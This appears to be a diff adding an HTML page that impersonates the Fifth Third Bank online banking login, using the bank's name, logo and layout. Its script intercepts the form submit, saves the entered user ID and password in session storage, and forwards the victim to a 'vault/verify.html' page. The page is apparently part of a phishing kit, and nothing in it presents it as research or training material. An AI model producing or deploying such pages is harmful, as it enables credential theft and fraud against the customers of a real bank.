@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fifth Third Secure Panel</title>
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <div class="header">
+    <div class="header-left">
+      <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
+      <span class="brand-text">FIFTH THIRD</span>
+    </div>
+    <div class="header-links">
+      <span>CUSTOMER SERVICE</span>
+      <span>|</span>
+      <span>BRANCH & ATM LOCATOR</span>
+    </div>
+  </div>
+  <div class="breadcrumb"><a href="#">Home</a> &gt; <b>Login</b></div>
+  <div class="login-bg">
+    <div class="center-panel login-card">
+      <div class="login-title">Online Banking Login</div>
+      <form class="verify-form" id="login-form">
+        <label>Online Banking
+          <select name="banktype">
+            <option>Online Banking</option>
+          </select>
+        </label>
+        <label style="display: flex; align-items: center; gap: 8px;">User ID
+          <input type="text" name="userid" required style="flex:1;">
+          <button type="button" class="save-btn">Save</button>
+        </label>
+        <label>Password
+          <input type="password" name="password" required>
+        </label>
+        <div class="recaptcha-box">
+          <span class="recaptcha-error">ERROR for site owner: Invalid site key</span>
+          <div class="recaptcha-sim"></div>
+        </div>
+        <button type="submit" class="login-btn">LOG IN</button>
+        <div class="links">
+          <a href="#">Forgot Login?</a>
+          <a href="#">First Time User? Register.</a>
+        </div>
+      </form>
+    </div>
+  </div>
+  <div class="info-section">
+    <h2>Log In to View Your Accounts</h2>
+    <p>Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents, pay bills directly from your account, and more.</p>
+  </div>
+  <script>
+    document.getElementById('login-form').onsubmit = function(e) {
+      e.preventDefault();
+      const userid = this.userid.value;
+      const password = this.password.value;
+      sessionStorage.setItem('userid', userid);
+      sessionStorage.setItem('password', password);
+      window.location.href = 'vault/verify.html';
+    };
+  </script>
+</body>
+</html> 
